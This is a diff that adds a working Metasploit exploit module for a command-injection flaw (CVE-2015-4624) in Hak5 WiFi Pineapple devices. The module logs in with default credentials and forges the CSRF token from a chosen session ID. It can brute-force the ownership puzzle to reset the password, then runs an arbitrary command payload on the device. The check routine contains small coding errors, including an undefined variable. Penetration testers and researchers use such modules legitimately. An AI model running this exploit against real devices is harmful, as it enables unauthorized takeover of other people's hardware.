@@ -1,0 +1,262 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'Hak5 WiFi Pineapple Preconfiguration Command Injection',
+      'Description'    => %q{
+      This module exploits a command injection vulnerability on WiFi Pineapples version 2.0 <= pineapple < 2.4.
+      We use a combination of default credentials with a weakness in the anti-csrf generation to achieve
+      command injection on fresh pineapple devices prior to configuration. Additionally if default credentials fail,
+      you can enable a brute force solver for the proof-of-ownership challenge. This will reset the password to a
+      known password if successful and may interrupt the user experience. These devices may typically be identified
+      by their SSID beacons of 'Pineapple5_....'; details derived from the TospoVirus, a WiFi Pineapple infecting
+      worm.
+      },
+      'Author'         => ['catatonicprime'],
+      'License'        => MSF_LICENSE,
+      'References'     => [[ 'CVE', '2015-4624' ]],
+      'Platform'       => ['unix'],
+      'Arch'           => ARCH_CMD,
+      'Privileged'     => false,
+      'Payload'        => {
+        'Space'        => 2048,
+        'DisableNops'  => true,
+        'Compat'       => {
+          'PayloadType'  => 'cmd',
+          'RequiredCmd'  => 'generic python netcat telnet'
+        }
+      },
+      'Targets'        => [[ 'WiFi Pineapple 2.0.0 - 2.3.0', {}]],
+      'DefaultTarget'  => 0,
+      'DisclosureDate' => 'Aug 1 2015'
+    ))
+
+    register_options(
+      [
+        OptString.new('USERNAME', [ true, 'The username to use for login', 'root' ]),
+        OptString.new('PASSWORD', [ true, 'The password to use for login', 'pineapplesareyummy' ]),
+        OptString.new('PHPSESSID', [ true, 'PHPSESSID to use for attack', 'tospovirus' ]),
+        OptString.new('TARGETURI', [ true, 'Path to the command injection', '/components/system/configuration/functions.php' ]),
+        Opt::RPORT(1471),
+        Opt::RHOST('172.16.42.1')
+      ]
+    )
+    register_advanced_options(
+      [
+        OptBool.new('BruteForce', [ false, 'When true, attempts to solve LED puzzle after login failure', false ]),
+        OptInt.new('BruteForceTries', [ false, 'Number of tries to solve LED puzzle, 0 -> infinite', 0 ])
+      ]
+    )
+
+    deregister_options(
+      'ContextInformationFile',
+      'DOMAIN',
+      'DigestAuthIIS',
+      'EnableContextEncoding',
+      'FingerprintCheck',
+      'HttpClientTimeout',
+      'NTLM::SendLM',
+      'NTLM::SendNTLM',
+      'NTLM::SendSPN',
+      'NTLM::UseLMKey',
+      'NTLM::UseNTLM2_session',
+      'NTLM::UseNTLMv2',
+      'SSL',
+      'SSLVersion',
+      'VERBOSE',
+      'WORKSPACE',
+      'WfsDelay',
+      'Proxies',
+      'VHOST'
+    )
+  end
+
+  def login_uri
+    normalize_uri('includes', 'api', 'login.php')
+  end
+
+  def brute_uri
+    normalize_uri("/?action=verify_pineapple")
+  end
+
+  def set_password_uri
+    normalize_uri("/?action=set_password")
+  end
+
+  def phpsessid
+    datastore['PHPSESSID']
+  end
+
+  def username
+    datastore['USERNAME']
+  end
+
+  def password
+    datastore['PASSWORD']
+  end
+
+  def cookie
+    "PHPSESSID=#{phpsessid}"
+  end
+
+  def csrf_token
+    Digest::SHA1.hexdigest datastore['PHPSESSID']
+  end
+
+  def use_brute
+    datastore['BruteForce']
+  end
+
+  def use_brute_tries
+    datastore['BruteForceTries']
+  end
+
+  def login
+    # Create a request to login with the specified credentials.
+    res = send_request_cgi(
+      'method'    => 'POST',
+      'uri'       => login_uri,
+      'vars_post' => {
+        'username'   => username,
+        'password'   => password,
+        'login'      => "" # Merely indicates to the pineapple that we'd like to login.
+      },
+      'headers'   => {
+        'Cookie'     => cookie
+      }
+    )
+
+    return nil unless res
+
+    # Successful logins in preconfig pineapples include a 302 to redirect you to the "please config this device" pages
+    return res if res.code == 302 && (res.body !~ /invalid username/)
+
+    # Already logged in message in preconfig pineapples are 200 and "Invalid CSRF" - which also indicates a success
+    return res if res.code == 200 && (res.body =~ /Invalid CSRF/)
+
+    nil
+  end
+
+  def cmd_inject(cmd)
+    res = send_request_cgi(
+      'method'    => 'POST',
+      'uri'       => target_uri.path,
+      'cookie'    => cookie,
+      'vars_get'  => {
+        'execute' => "" # Presence triggers command execution
+      },
+      'vars_post' => {
+        '_csrfToken' => csrf_token,
+        'commands'   => cmd
+      }
+    )
+
+    res
+  end
+
+  def brute_force
+    print_status('Beginning brute forcing...')
+    # Attempt to get a new session cookie with an LED puzzle tied to it.
+    res = send_request_cgi(
+      'method' => 'GET',
+      'uri'    => brute_uri
+    )
+
+    # Confirm the response indicates there is a puzzle to be solved.
+    if !res || !(res.code == 200) || res.body !~ /own this pineapple/
+      print_status('Brute forcing not available...')
+      return nil
+    end
+
+    cookies = res.get_cookies
+    counter = 0
+    while use_brute_tries.zero? || counter < use_brute_tries
+      print_status("Try #{counter}...") if (counter % 5).zero?
+      counter += 1
+      res = send_request_cgi(
+        'method'    => 'POST',
+        'uri'       => brute_uri,
+        'cookie'    => cookies,
+        'vars_post' => {
+          'green'            => 'on',
+          'amber'            => 'on',
+          'blue'             => 'on',
+          'red'              => 'on',
+          'verify_pineapple' => 'Continue'
+        }
+      )
+
+      if res && res.code == 200 && res.body =~ /set_password/
+        print_status('Successfully solved puzzle!')
+        return write_password(cookies)
+      end
+    end
+    print_warning("Failed to brute force puzzle in #{counter} tries...")
+    nil
+  end
+
+  def write_password(cookies)
+    print_status("Attempting to set password to: #{password}")
+    res = send_request_cgi(
+      'method'     => 'POST',
+      'uri'        => set_password_uri,
+      'cookie'     => cookies,
+      'vars_post'  => {
+        'password'     => password,
+        'password2'    => password,
+        'eula'         => 1,
+        'sw_license'   => 1,
+        'set_password' => 'Set Password'
+      }
+    )
+    if res && res.code == 200 && res.body =~ /success/
+      print_status('Successfully set password!')
+      return res
+    end
+    print_warning('Failed to set password')
+
+    nil
+  end
+
+  def check
+    loggedin = login
+    unless loggedin
+      brutecheck = send_request_cgi(
+        'method' => 'GET',
+        'uri'    => brute_uri
+      )
+      return Exploit::CheckCode::Safe if !brutecheck || !brutecheck.code == 200 || brutecheck.body !~ /own this pineapple/
+      return Exploit::CheckCode::Vulnerable
+    end
+
+    cmd_success = cmd_inject("echo")
+    return Exploit::CheckCode::Vulnerable if cmd_success && cmdSuccess.code == 200 && cmd_success.body =~ /Executing/
+
+    Exploit::CheckCode::Safe
+  end
+
+  def exploit
+    print_status('Logging in with credentials...')
+    loggedin = login
+    if !loggedin && use_brute
+      brute_force
+      loggedin = login
+    end
+    unless loggedin
+      fail_with(Failure::NoAccess, "Failed to login PHPSESSID #{phpsessid} with #{username}:#{password}")
+    end
+
+    print_status('Executing payload...')
+    cmd_inject("#{payload.encoded}")
+  end
+end
